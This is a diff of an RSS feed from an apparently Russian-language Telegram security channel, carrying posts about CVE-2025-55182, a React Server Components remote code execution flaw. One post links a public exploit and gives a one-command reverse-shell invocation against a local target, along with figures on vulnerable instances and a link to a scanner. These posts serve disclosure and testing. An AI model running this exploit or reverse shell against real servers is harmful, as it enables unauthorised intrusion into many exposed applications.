@@ -1,5 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Thu, 04 Dec 2025 04:07:22 +0000</lastBuildDate><item><title>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/203</link><description>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Fri, 05 Dec 2025 11:53:32 +0000</lastBuildDate><item><title>Рабочий эксплоит</title><link>https://t.me/P0x3k_1N73LL1G3NC3/204</link><description>Рабочий эксплоит
+Спустя сутки после тряски с нейрослопом, его, наконец, написали https://github.com/Spritualkb/CVE-2025-55182-exp (сырой запрос можно найти тут). Работает на любом уязвимом приложении из коробки, я уже проверил сам.
+Получить шелл в одну команду можно так
+python3 exp.py http://127.0.0.1:3000 --revshell 127.0.0.1 1234
+Предварительно надо не забыть поднять слушатель (не смотря на надпись, сам скрипт этого не делает).
+Сейчас в интернете находится 8.7 миллионов потенциально уязвимых инстансов, — 69% всех облачных сред используют Next.js — это каждый второй прод в облаке.
+Чтобы не проверять их все вручную, для Burp написали готовое расширение, которое проверяет уязвимость в фоне https://github.com/tobiasGuta/Next.js-RSC-RCE-Scanner-Burp-Suite-Extension (в active scan++ тоже добавили)
+
+[Media: Фото]</description><pubDate>Fri, 05 Dec 2025 11:53:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_204</guid></item><item><title>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/203</link><description>React Server Components #RCE 10/10 - CVE-2025-55182 (React4shell)
 В официальном блоге React только что выкатили пост про CVE-2025-55182, которая позволяет в один запрос получить RCE. Уязвимы версии 19.0.0, 19.1.0, 19.1.1, 19.2.0, а еще фреймворки Next.JS, Vite, Parcel, и Waku.
 Сам баг находится в RSC-рантайме, который принимает данные и небезопасно десериализует их. Уязвимость можно считать одной из самых критичных, которые находили в React за все время.
 Exploit: https://github.com/ejpir/CVE-2025-55182-poc
